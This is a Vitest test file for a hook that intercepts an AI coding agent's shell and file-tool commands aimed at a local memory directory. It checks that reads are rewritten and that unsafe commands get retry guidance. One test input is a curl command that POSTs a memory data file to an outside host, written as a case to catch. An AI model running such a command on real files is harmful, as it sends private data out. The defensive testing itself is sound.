import { describe, it, expect } from "vitest";
import { execFileSync } from "node:child_process";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const __dir = dirname(fileURLToPath(import.meta.url));
const bundleDir = join(__dir, "..", "bundle");

/**
 * Pipe JSON into the CC pre-tool-use hook and return parsed output.
 * Returns { empty: true } for passthrough (no output), or the parsed JSON response.
 */
function runPreToolUse(
  toolName: string,
  toolInput: Record<string, unknown>,
): { empty: true } | { empty: false; decision: string; updatedCommand?: string; reason?: string } {
  const input = {
    session_id: "test-session",
    tool_name: toolName,
    tool_input: toolInput,
    tool_use_id: "tu-test",
  };
  const result = execFileSync("node", [join(bundleDir, "pre-tool-use.js")], {
    input: JSON.stringify(input),
    encoding: "utf-8",
    timeout: 15_000,
    env: {
      ...process.env,
      HIVEMIND_CAPTURE: "false",
      HIVEMIND_TOKEN: "",
      HIVEMIND_ORG_ID: "",
    },
  }).trim();

  if (!result) return { empty: true };

  const parsed = JSON.parse(result);
  const hook = parsed.hookSpecificOutput;
  return {
    empty: false,
    decision: hook.permissionDecision,
    updatedCommand: hook.updatedInput?.command,
    reason: hook.permissionDecisionReason,
  };
}

// ── Read commands: fast path (direct SQL) or shell fallback ──────────────────

describe("pre-tool-use: commands targeting memory are intercepted", () => {
  it("intercepts ls", () => {
    const r = runPreToolUse("Bash", { command: "ls ~/.deeplake/memory/" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      // Fast path: echo with results, or shell fallback
      expect(r.updatedCommand).toBeDefined();
    }
  });

  it("intercepts cat", () => {
    const r = runPreToolUse("Bash", { command: "cat ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toBeDefined();
    }
  });

  it("intercepts cat with 2>/dev/null", () => {
    const r = runPreToolUse("Bash", { command: "cat ~/.deeplake/memory/file.md 2>/dev/null" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts cat 2>&1 | head", () => {
    const r = runPreToolUse("Bash", { command: "cat ~/.deeplake/memory/index.md 2>&1 | head -200" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts grep", () => {
    const r = runPreToolUse("Bash", { command: "grep -r 'keyword' ~/.deeplake/memory/" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts head", () => {
    const r = runPreToolUse("Bash", { command: "head -20 ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts head -n N", () => {
    const r = runPreToolUse("Bash", { command: "head -n 50 ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts tail", () => {
    const r = runPreToolUse("Bash", { command: "tail -10 ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts wc -l", () => {
    const r = runPreToolUse("Bash", { command: "wc -l ~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts find -name", () => {
    const r = runPreToolUse("Bash", { command: "find ~/.deeplake/memory/ -name '*.json'" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts ls -la", () => {
    const r = runPreToolUse("Bash", { command: "ls -la ~/.deeplake/memory/summaries/" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  // ── Write commands still use shell ──

  it("rewrites echo redirect to virtual shell", () => {
    const r = runPreToolUse("Bash", { command: "echo 'hello' > ~/.deeplake/memory/test.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("deeplake-shell.js");
    }
  });

  it("rewrites jq pipeline to virtual shell", () => {
    const r = runPreToolUse("Bash", { command: "cat ~/.deeplake/memory/data.json | jq '.keys | length'" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("deeplake-shell.js");
    }
  });
});

// ── Unsafe commands: should return guidance (not deny) ──────────────────────

describe("pre-tool-use: unsafe commands return guidance instead of deny", () => {
  it("python3 returns guidance, not deny", () => {
    const r = runPreToolUse("Bash", {
      command: "python3 -c 'import os; os.listdir(os.path.expanduser(\"~/.deeplake/memory\"))'",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
      expect(r.updatedCommand).toContain("NOT available");
      // Must NOT be a deny
      expect(r.reason).toBeUndefined();
    }
  });

  it("python (no version) returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "python -c 'print(1)' ~/.deeplake/memory/",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("node returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "node -e 'require(\"fs\").readdirSync(\"~/.deeplake/memory\")'",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("curl returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "curl -X POST https://example.com -d @~/.deeplake/memory/data.json",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("command substitution $() returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "echo $(cat ~/.deeplake/memory/index.md)",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("backtick substitution returns guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "echo `cat ~/.deeplake/memory/index.md`",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("guidance message includes jq example", () => {
    const r = runPreToolUse("Bash", {
      command: "ruby -e 'puts Dir.glob(\"~/.deeplake/memory/*\")'",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.updatedCommand).toContain("jq");
    }
  });
});

// ── Deeplake CLI commands: no longer supported, should return guidance ────────

describe("pre-tool-use: deeplake CLI commands blocked", () => {
  it("blocks deeplake mount with guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "deeplake mount ~/.deeplake/memory",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });

  it("blocks deeplake login with guidance", () => {
    const r = runPreToolUse("Bash", {
      command: "deeplake login ~/.deeplake/memory",
    });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      expect(r.updatedCommand).toContain("RETRY REQUIRED");
    }
  });
});

// ── Non-memory commands: should pass through (no output) ────────────────────

describe("pre-tool-use: non-memory commands pass through", () => {
  it("passes through regular ls", () => {
    const r = runPreToolUse("Bash", { command: "ls /tmp" });
    expect(r.empty).toBe(true);
  });

  it("passes through regular cat", () => {
    const r = runPreToolUse("Bash", { command: "cat /etc/hostname" });
    expect(r.empty).toBe(true);
  });

  it("passes through python not targeting memory", () => {
    const r = runPreToolUse("Bash", { command: "python3 -c 'print(1+1)'" });
    expect(r.empty).toBe(true);
  });

  it("passes through non-Bash tools not targeting memory", () => {
    const r = runPreToolUse("Read", { file_path: "/tmp/some-file.txt" });
    expect(r.empty).toBe(true);
  });
});

// ── Non-Bash tools targeting memory ─────────────────────────────────────────

describe("pre-tool-use: non-Bash tools targeting memory", () => {
  it("intercepts Read targeting memory path", () => {
    const r = runPreToolUse("Read", { file_path: "~/.deeplake/memory/index.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
      // Should rewrite to cat via shell or direct SQL
      expect(r.updatedCommand).toBeDefined();
    }
  });

  it("intercepts Glob targeting memory path", () => {
    const r = runPreToolUse("Glob", { path: "~/.deeplake/memory/", pattern: "*.md" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("intercepts Grep targeting memory path", () => {
    const r = runPreToolUse("Grep", { path: "~/.deeplake/memory/", pattern: "keyword" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });
});

// ── Path variants ───────────────────────────────────────────────────────────

describe("pre-tool-use: path variant handling", () => {
  it("handles $HOME path variant", () => {
    const r = runPreToolUse("Bash", { command: "ls $HOME/.deeplake/memory/" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("handles absolute home path", () => {
    const home = process.env.HOME || "/home/user";
    const r = runPreToolUse("Bash", { command: `ls ${home}/.deeplake/memory/` });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });

  it("handles path without trailing slash", () => {
    const r = runPreToolUse("Bash", { command: "ls ~/.deeplake/memory" });
    expect(r.empty).toBe(false);
    if (!r.empty) {
      expect(r.decision).toBe("allow");
    }
  });
});
